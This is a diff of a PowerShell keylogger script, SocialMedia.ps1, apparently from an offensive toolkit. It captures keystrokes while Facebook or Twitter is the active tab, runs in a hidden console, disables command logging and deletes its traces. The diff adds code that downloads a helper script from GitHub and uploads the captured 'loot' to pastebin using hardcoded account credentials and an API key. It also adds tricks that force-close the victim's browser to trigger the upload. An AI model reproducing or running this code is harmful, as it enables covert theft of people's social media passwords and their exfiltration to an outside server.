@@ -6,23 +6,36 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: UserLand
-   PS cmdlet Dev version: v1.4.12
+   PS cmdlet Dev version: v1.5.14
    
 .DESCRIPTION
-   Capture target keyboard keystrokes if facebook or
-   twitter is open in web browser (browser active tab)
-   This cmdlet will NOT messup with browser or system!
+   Start recording keystrokes (loop) if target has
+   facebook or twitter in the 'active browser tab'
 
 .NOTES
-   Browsers supported:MsEdge,Chrome,Chromium,Opera,Safari,Firefox
-   The logfiles will be saved under target %TMP% directory under
-   names 1_[random].Facebook OR 1_[random].Twitter extensions.
+   Browsers supported: MsEdge,Chrome,Chromium,Opera,Safari,Firefox
+   Multiple logfiles will be saved under target %TMP% directory with
+   the names 1_[random].Facebook OR 1_[random].Twitter [extensions]
 
-   Cmdlet only starts recording keystrokes if facebook or twitter
-   its active on browser tab, and it stops is execution if target
-   switchs from social media to another site or closes browser, it
-   resume capture if social media is accessed again. (active tab)
-   We can also schedule this cmdlet execution to start at [HH:mm]
+   This cmdlet starts recording keystrokes if the target has facebook
+   or twitter in the 'active tab' and stops recording whenever it detects
+   the exit of the social media tab. in that case it stops the key`logger
+   process, renames the logfile (loot) and waits for the social media to
+   be accessed again to start recording or to be told to stop recording.
+
+   We can also schedule this cmdlet execution to start at [HH:mm] hours
+
+   SendToPasteBin function sends loots to pastebin in 3 diferent
+   ocasions: 1- target user switchs from FB tab to a diferent tab
+   2- Terminal console recives a CTRL+C command 3- target browser
+   is suddenly closed (in this occasion cmdlet waits for browser
+   to start before sending loot to pastebin and resume execution)
+
+   [trick][open new tab == trigger SendToPasteBin]
+   cmd /c start /max https://elgoog.im/pacman
+
+   [trick][force target to reopen browser == trigger SendToPasteBin]
+   Get-Process -Name opera|ForEach{Stop-Process -Name opera -Force}
 
    1200 milliseconds (default) its the amount of time required for
    key`loger to start execution and build pid.log file. If we chose
@@ -42,29 +55,41 @@
 .Parameter Schedule
    Schedule cmdlet execution at: [HH:mm]
 
+.Parameter SendToPasteBin
+   Switch to send loot to pastebin server
+
+.Parameter PastebinUsername
+   PasteBin UserName to authenticate to
+
+.Parameter PastebinPassword
+   PasteBin Password to authenticate to
+
+.Parameter PastebinDeveloperKey
+   The pasteBin API key to authenticate with
+
 .EXAMPLE
-   PS C:\> .\SocialMedia.ps1 -Mode 'start'
+   PS C:\> .\SocialMedia.ps1 -mode 'start'
    Start browser key`logger capture 
 
 .EXAMPLE
-   PS C:\> .\SocialMedia.ps1 -delay '5000'
-   Use 5 seconds delay between each loop
+   PS C:\> .\SocialMedia.ps1 -delay '5000' -force
+   Use 5 seconds between each loop + bypass: Is_Browser_Active?
 
 .EXAMPLE
-   PS C:\> .\SocialMedia.ps1 -force
-   Bypass check: Is_Browser_Active?
-
-.EXAMPLE
-   PS C:\> .\SocialMedia.ps1 -Mode 'stop'
-   Stop key`logger and leak keystrokes on screen 
-
-.EXAMPLE
-   PS C:\> .\SocialMedia.ps1 -schedule '02:34' -Mode 'start'
+   PS C:\> .\SocialMedia.ps1 -schedule '02:34' -mode 'start'
    Schedule cmdlet capture to start at [HH:mm] hours
 
 .EXAMPLE
-   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -Mode 'start' -delay '200' -force"
-   Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials   
+   PS C:\> .\SocialMedia.ps1 -mode 'stop'
+   Stop key`logger and leak keystrokes on screen 
+
+.EXAMPLE
+   PS C:\> .\SocialMedia.ps1 -mode 'start' -PastebinUsername 'pedro_testing' -PastebinPassword 'angelapastebin' -SendToPasteBin
+   Start key`logger and send logfile to pastebin everytime void.log is renamed or CTRL+C its detected while recording keystrokes.
+
+.EXAMPLE
+   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -delay '200' -force"
+   Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials
 
 .INPUTS
    None. You cannot pipe objects into SocialMedia.ps1
@@ -92,6 +117,10 @@
 
 
 [CmdletBinding(PositionalBinding=$false)] param(
+   [string]$PastebinDeveloperKey='1ab4a1a4e39c94db4f653127a45e7159',
+   [string]$PastebinPassword="angelapastebin",
+   [string]$PastebinUsername="pedro_testing",
+   [switch]$SendToPasteBin,
    [string]$Schedule="now",
    [string]$Mode="start",
    [int]$Delay='1200',
@@ -100,7 +129,7 @@
 
 
 Clear-Host
-$CmdletVersion = "v1.4.12"
+$CmdletVersion = "v1.5.14"
 $CurrentTime = (Get-Date -Format 'HH:mm')
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -183,46 +212,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 Keystrokes")
 
 
-function Invoke-ScheduleStart ()
-{
-   <#
-   .SYNOPSIS
-      Author: @r00t-3xp10it
-      Helper - Schedule cmdlet execution! [HH:mm]
-   #>
-
-   If($Schedule -match '^(\d+\d+:+\d+\d)$')
-   {
-      write-host "   ╰➤ 🕘 " -ForegroundColor Red -NoNewline
-      write-host "Execution schedule to " -ForegroundColor Blue -NoNewline
-      write-host "$Schedule" -NoNewline
-      write-host " hours." -ForegroundColor Blue
-
-      while($true)
-      {
-         ## Compare $CurrentTime with $StartTime
-         $CurrentTime = (Get-Date -Format 'HH:mm')
-         If($CurrentTime -match "$Schedule")
-         {
-            break # Continue SocialMedia cmdlet execution
-         }
-
-         ## loop each 10 seconds
-         Start-Sleep -Seconds 10
-      }
-   }
-   Else
-   {
-      ## Wrong schedule user input error msg
-      write-host "     ╰➤ ⛔️ Abort: " -ForegroundColor Red -NoNewline
-      write-host "wrong schedule '" -NoNewline
-      write-host "$Schedule" -ForegroundColor Red -NoNewline
-      write-host "' input! [exec:" -NoNewline
-      write-host "now" -ForegroundColor Green -NoNewline
-      write-host "]`n"
-   }
-}
-
 function Invoke-KillAllPids ()
 {
    <#
@@ -270,8 +259,105 @@ function Invoke-IsBrowserActive ()
    ## Make sure we have active browser names
    If([string]::IsNullOrEmpty($TestBrowsers))
    {
-      write-host "`n  📛 Error: none supported browsers found active.`n" -ForegroundColor Red
+      write-host "`n  📛 Error: none supported browsers found open.`n" -ForegroundColor Red
       exit ## Exit cmdlet execution (default)
+   }
+}
+
+function Invoke-ScheduleStart ()
+{
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Schedule cmdlet execution! [HH:mm]
+   #>
+
+   If($Schedule -match '^(\d+\d+:+\d+\d)$')
+   {
+      write-host "   ╰➤ 🕘 " -ForegroundColor Red -NoNewline
+      write-host "Execution schedule to " -ForegroundColor Blue -NoNewline
+      write-host "$Schedule" -NoNewline
+      write-host " hours." -ForegroundColor Blue
+
+      while($true)
+      {
+         ## Compare $CurrentTime with $StartTime
+         $CurrentTime = (Get-Date -Format 'HH:mm')
+         If($CurrentTime -match "$Schedule")
+         {
+            break # Continue SocialMedia cmdlet execution
+         }
+
+         ## loop each 10 seconds
+         Start-Sleep -Seconds 10
+      }
+   }
+   Else
+   {
+      ## Wrong schedule user input error msg
+      write-host "     ╰➤ 📛 Abort: " -ForegroundColor Red -NoNewline
+      write-host "wrong schedule '" -NoNewline
+      write-host "$Schedule" -ForegroundColor Red -NoNewline
+      write-host "' input! [exec:" -NoNewline
+      write-host "now" -ForegroundColor Green -NoNewline
+      write-host "]`n"
+   }
+}
+
+function Invoke-SendToPasteBin ()
+{
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - 🔥 Send loot(s) to pastebin website 🔥
+
+   .NOTES
+      Pastebin_Title_Example: SKYNET_Facebook_16_44_23
+      Remark: pastebin webserver only accepts 20 pastes per day!
+      Remark: Function takes aprox 2-3 minutes [background run]
+      for the paste to be accesseble in pastebin webserver page
+
+      Remark: SendToPasteBin function only sends the loots to pastebin
+      if the target user moves from social media active browser tab to
+      a diferent tab OR by closing browser process. If key`logger its
+      still capturing then the best aproch is to stop process Example:
+
+      Get-Process -Name opera|ForEach{Stop-Process -Name opera -Force}
+
+      The next time target user starts browser SendToPasteBin kicks in
+   #>
+
+   If(-not(Test-Path -Path "$PasteThisFile" -EA SilentlyContinue))
+   {
+      $PasteThisFile = "$Env:TMP\void.log"
+   }
+
+   If([bool](Test-Path -Path "$Env:TMP\SendToPasteBin.ps1") -match '^(True)$')
+   {
+      $PasteTimes = (Get-Date -Format 'HH_mm_ss')
+      $PasteTitle = "${Env:COMPUTERNAME}_${SocialSite}"
+      write-host "  ╰➤ 📮 Sending loot to pastebin webserver." -ForegroundColor Blue
+      write-host "`n  Paste number          : $Counter"
+
+      If($Counter -lt 20)
+      {
+         write-host "  Pastebin username     : $PastebinUsername"
+         write-host "  Pastebin password     : $PastebinPassword"
+         write-host "  Pastebin developerKey : " -NoNewline
+         write-host "$PastebinDeveloperKey" -ForegroundColor DarkYellow
+         write-host "  Pastebin account Url  : " -NoNewline
+         write-host "https://pastebin.com/u/$PasteBinUserName" -ForegroundColor Green
+         write-host "  Send to pastebin      : $PasteThisFile"
+         write-host "  Pastebin filename     : ${PasteTitle}_${PasteTimes}`n"
+
+         ## Execute sendtopastebin cmdlet in a hidden console detach from parent process [SocialMedia process pid]
+         Start-Process -WindowStyle hidden powershell -ArgumentList "-file $Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PastebinUsername -PastebinPassword $PastebinPassword -PastebinDeveloperKey $PastebinDeveloperKey -PasteTitle $PasteTitle -filepath $PasteThisFile -Egg true`"";
+         Start-Sleep -Seconds 3;write-host "  🎖️ Loot file deliver to pastebin server!" -ForegroundColor Blue
+      }
+      Else
+      {
+         write-host "  📛 Error: Max pastebin pastes per day reached.`n" -ForegroundColor Red      
+      }
    }
 }
 
@@ -283,7 +369,7 @@ function Invoke-CheckMediaForChange ()
       Helper - Detect [facebook<->twitter] active tab changes.
    #>
 
-   If(Test-Path -Path "$Env:TMP\Smeagol.log")
+   If([bool](Test-Path -Path "$Env:TMP\Smeagol.log") -match '^(True)$')
    {
       If($StartKeys -imatch 'Facebook'){$SocialSite = "Facebook"}
       If($StartKeys -imatch '/ X |twitter.com'){$SocialSite = "Twitter"}
@@ -298,13 +384,13 @@ function Invoke-CheckMediaForChange ()
          write-host "$SocialSite" -ForegroundColor Green
 
          ## Stop key`logger PID(s)
-         If(Test-Path -Path "$Env:TMP\pid.log")
+         If([bool](Test-Path -Path "$Env:TMP\pid.log") -match '^(True)$')
          {
             ## Kill all PID's
             Invoke-KillAllPids
 
             ## CleanUp -- Rename
-            If(Test-Path -Path "$Env:TMP\void.log")
+            If([bool](Test-Path -Path "$Env:TMP\void.log") -match '^(True)$')
             {
                [int]$Counter = [int]$Counter+1
                ## Random FileName generation - rename logfile [name+extension]
@@ -320,6 +406,13 @@ function Invoke-CheckMediaForChange ()
                write-host "void.log" -ForegroundColor Yellow -NoNewline
                write-host " renamed to: " -NoNewline
                write-host "${Name}.${LastAccessed}" -ForegroundColor Yellow
+
+               ## Send loot to pastebin
+               If($SendToPasteBin.IsPresent)
+               {
+                  $PasteThisFile = "$Env:TMP\${Name}.${LastAccessed}"
+                  Invoke-SendToPasteBin
+               }
 
                ## CleanUP
                Remove-Item -Path "$Env:TMP\pid.log" -Force
@@ -353,7 +446,12 @@ If($Mode -iMatch '^(start)$')
    Else
    {
       ## Bypass check: Is_Browser_Active?
-      write-host "   ╰➤ 🕘 Waiting for browser to start capture!" -ForegroundColor Yellow 
+      write-host "   ╰➤ 🕘 Waiting for remote browser to open!" -ForegroundColor Yellow 
+   }
+
+   If($SendToPasteBin.IsPresent)
+   {
+      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SendToPasteBin.ps1" -OutFile "$Env:TMP\SendToPasteBin.ps1"|Unblock-File
    }
 
    echo "`n"
@@ -413,16 +511,38 @@ If($Mode -iMatch '^(start)$')
                write-host "  💀 Key`logger running in background!"
                Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
 
+               ## This function hangs script?
+               # Send loot to pastebin [CTRL+C]
+               If($SendToPasteBin.IsPresent)
+               {
+                  ## EXEC ONLY IF [CTRL+C] ITS PRESSED
+                  [console]::treatcontrolcasinput = $true
+                  If([console]::keyavailable)
+                  {
+                     $key = [system.console]::readkey($true)
+                     If(($key.modifiers -band [consolemodifiers]"control") -and ($key.key -eq "c"))
+                     {
+                        [int]$Counter = [int]$Counter+1
+                        $PasteThisFile = "$Env:TMP\void.log"
+                        write-host "  ╰➤ 🔥 Abort: Console detected CTRL+C command 🔥" -ForegroundColor Red
+
+                        ## Send-To-PasteBin
+                        Invoke-SendToPasteBin
+                        echo "";exit ## Exit cmdlet
+                     }
+                  }
+               }
+
             }
             Else
             {
                write-host "  📛 Error: none social media found active!" -ForegroundColor Red
-               If(Test-Path -Path "$Env:TMP\pid.log")
+               If([bool](Test-Path -Path "$Env:TMP\pid.log") -match '^(True)$')
                {
                   ## Kill all PID's
                   Invoke-KillAllPids
 
-                  If(Test-Path -Path "$Env:TMP\void.log")
+                  If([bool](Test-Path -Path "$Env:TMP\void.log") -match '^(True)$')
                   {
                      [int]$Counter = [int]$Counter+1
                      ## Random FileName generation - rename logfile [name+extension]
@@ -439,6 +559,13 @@ If($Mode -iMatch '^(start)$')
                      write-host " renamed to: " -NoNewline
                      write-host "${Name}.${SocialSite}" -ForegroundColor Yellow
 
+                     ## Send loot to pastebin
+                     If($SendToPasteBin.IsPresent)
+                     {
+                        $PasteThisFile = "$Env:TMP\${Name}.${SocialSite}"
+                        Invoke-SendToPasteBin
+                     }
+
                      ## CleanUP
                      Remove-Item -Path "$Env:TMP\pid.log" -Force
                      Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
@@ -446,7 +573,7 @@ If($Mode -iMatch '^(start)$')
                      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
                   }
                }
-            }         
+            }      
          }
       }
       ## Delay time between loops
@@ -512,6 +639,8 @@ If($Mode -iMatch '^(stop)$')
 
       ## CleanUP
       Remove-Item -Path "$Env:TMP\*.log" -Force
+      Remove-Item -Path "$Env:TMP\Out-Pastebin.ps1" -Force
+      Remove-Item -Path "$Env:TMP\SendToPasteBin.ps1" -Force
       Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
       Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
    }
@@ -524,4 +653,6 @@ If($Mode -iMatch '^(stop)$')
 
 ## CleanUP
 Remove-Item -Path "$Env:TMP\mscore.ps1" -Force
+Remove-Item -Path "$Env:TMP\Out-Pastebin.ps1" -Force
+Remove-Item -Path "$Env:TMP\SendToPasteBin.ps1" -Force
 exit
